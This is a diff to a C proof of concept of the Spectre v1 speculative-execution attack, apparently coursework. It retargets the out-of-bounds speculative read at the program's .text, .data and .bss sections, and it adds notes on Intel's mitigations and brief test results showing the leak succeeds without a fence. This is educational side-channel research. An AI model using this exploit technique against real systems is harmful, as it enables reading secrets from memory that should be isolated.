@@ -35,23 +35,25 @@
 #endif /* ifdef _MSC_VER */
 
 #ifdef NOSSE2
-#define NORDTSCP
-#define NOMFENCE
-#define NOCLFLUSH
+#define NORDTSCP  // disable accurate timer
+#define NOMFENCE  // disable memory fence
+#define NOCLFLUSH // disable memory flush
 #endif
 
 // inited gose to data, uninited gose to bss
-enum Mode {DATA = 0, BSS = 1};
-enum Mode mode = BSS;
-#define BSS_OFFSET 140000
-
-char ui[256];
+enum Mode {TEXT = 1, DATA = 2, BSS = 3};
+enum Mode mode = TEXT;
 
 /********************************************************************
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
-uint8_t unused1[64];
+volatile uint8_t data_base_data[33] = 
+  {0x74, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 
+  0x74, 0x68, 0x65, 0x20, 0x62, 0x61, 0x73, 0x65, 
+  0x20, 0x6F, 0x66, 0x20, 0x64, 0x61, 0x74, 0x61, 
+  0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 
+  0x00};
 uint8_t array1[16] = {
   1,
   2,
@@ -70,6 +72,19 @@ uint8_t array1[16] = {
   15,
   16
 };
+
+// approx. base address of .text .data and .bss section
+//volatile uint8_t* data_base = &data_base_data;
+volatile uint8_t* data_base = data_base_data;
+volatile uint8_t bss_base[16];
+volatile char* text_base = "this is the base of text -ish";
+
+/////////////////////////////////////////////
+/* victm can be placed anywhere below here */
+
+
+char ui[256];
+
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
@@ -79,6 +94,12 @@ uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 #ifdef LINUX_KERNEL_MITIGATION
 /* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
+
+/*
+    Shuai: The newest Linux Patch provided a secure way to 
+    chcek array boundary without leaking side-channel info
+*/
+
 /**
  * array_index_mask_nospec() - generate a mask that is ~0UL when the
  * 	bounds check succeeds and 0 otherwise
@@ -111,6 +132,23 @@ void victim_function(size_t x) {
 		 * the read.
 		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
 		 */
+
+     /*
+     Shuai: 
+     TLDR intel proposes:
+     1. urge developer add memory fence around sensitive data access (used in this case)
+          pro: very litte overhead, very effective
+          con: intel / amd have no cotrol on it
+     2. flush the indirect branch predictor based on a time (used by 10+gen intel)
+          pro: easy to implement
+          con: performance hit scales to aggressivness of this policy (i don't think its implemented)
+     3. thread based indirect branch predictor (add a "thread ID" field to BP)
+          pro: easy-ish to implement
+          con: rendering global BP useless
+     4. delayed update to BP buffer (used by 10+gen intel)
+          pro: very effective
+          con: hard to implement, great performance hit to hard-to-predit case or small loops
+     */
 		_mm_lfence();
 #endif
 #ifdef LINUX_KERNEL_MITIGATION
@@ -295,14 +333,24 @@ int main(int argc,
   int cache_hit_threshold = 80;
 
   /* Default for malicious_x is the secret string address */
-  size_t malicious_ui = (size_t)(ui - (char * ) array1);
-  size_t malicious_x = (size_t)(secret - (char * ) array1);
-  //printf("base is %ld\n",malicious_x);
-  //printf("ui   is %ld\n",malicious_ui);
-  malicious_x += (mode == BSS ? BSS_OFFSET : 0);
+  // size_t malicious_x = (size_t)(secret - (char * ) array1);
+  size_t malicious_x;
+  if (mode == TEXT) { // inspect the .text section
+    malicious_x = (size_t)((char * ) text_base - (char * ) array1);
+  } else if (mode == DATA){// inspect the .data section
+    malicious_x = (size_t)((char * ) data_base - (char * ) array1);
+  } else {
+    malicious_x = (size_t)((char * ) bss_base - (char * ) array1);
+  }
+  printf("text base is   : %p\n", text_base);
+  printf("secret base is : %p\n", secret);
+  printf("data base is   : %p\n", data_base);
+  printf("arr1 base is   : %p\n", array1);
+  printf("bss base is    : %p\n", bss_base);
+  printf("ui base is     : %p\n", ui);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
-  int len = 1000;
+  int len = 100;
 
   printf ("Enter your password: ");
   scanf ("%s", ui);
@@ -404,3 +452,12 @@ int main(int argc,
   }
   return (0);
 }
+
+/*
+
+Tested on Columbia ECE server
+No protection: all correct
+enable fence protection: Nope
+enable 
+
+*/
